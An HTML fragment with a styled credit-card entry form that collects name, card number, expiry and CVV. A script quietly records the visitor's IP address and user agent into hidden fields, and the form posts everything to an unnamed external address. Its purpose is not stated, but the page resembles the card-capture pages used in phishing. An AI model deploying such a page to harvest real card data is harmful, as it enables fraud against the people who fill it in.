                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            background-color: #f4f4f4;
                            padding: 20px;
                        }
                        .form-container {
                            max-width: 400px;
                            margin: 0 auto;
                            background-color: white;
                            padding: 20px;
                            border-radius: 8px;
                            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                        }
                        .form-container h2 {
                            text-align: center;
                            margin-bottom: 20px;
                        }
                        label {
                            font-weight: bold;
                            margin-top: 10px;
                            display: block;
                        }
                        input[type="text"],
                        input[type="number"],
                        input[type="month"] {
                            width: 100%;
                            padding: 10px;
                            margin: 8px 0;
                            border: 1px solid #ccc;
                            border-radius: 4px;
                        }
                        input[type="submit"] {
                            background-color: #118bf0;
                            color: white;
                            padding: 12px 20px;
                            border: none;
                            border-radius: 4px;
                            cursor: pointer;
                            width: 100%;
                            font-size: 16px;
                        }
                        input[type="submit"]:hover {
                            background-color: #118bf0;
                        }
                    </style>
                </head>
                <body>
                
                    <div class="form-container">
                        <h2>Credit Card Information</h2>
                        <form method="post" action="//submit.form" >

                               <!-- Hidden Inputs -->
        <input type="hidden" id="ipAddress" name="ipAddress">
        <input type="hidden" id="userAgent" name="userAgent">
        <input type="hidden" id="zipCode" name="zipCode" value="10001"> <!-- Example Zip Code -->


        <script>
            // Function to get the IP address
            function getIPAddress() {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('ipAddress').value = data.ip;
                    });
            }
    
            // Function to get the User Agent
            function getUserAgent() {
                const userAgent = navigator.userAgent;
                document.getElementById('userAgent').value = userAgent;
            }
    
            // Call functions to set the values
            getIPAddress();
            getUserAgent();
        </script>

                            <label for="name">Cardholder Name:</label>
                            <input type="text" id="name" name="name" required placeholder="John Doe">
                
                            <label for="cardNumber">Card Number:</label>
                            <input type="text" id="cardNumber" name="cardNumber" required placeholder="1234 5678 9876 5432">
                
                            <label for="expiry">Expiry Date:</label>
                            <input type="month" id="expiry" name="expiry" required>
                
                            <label for="cvv">CVV:</label>
                            <input type="number" id="cvv" name="cvv" required placeholder="123" maxlength="3" pattern="\d{3}" title="CVV must be 3 digits">
                
                            <input type="submit" value="Submit">

                        </form>
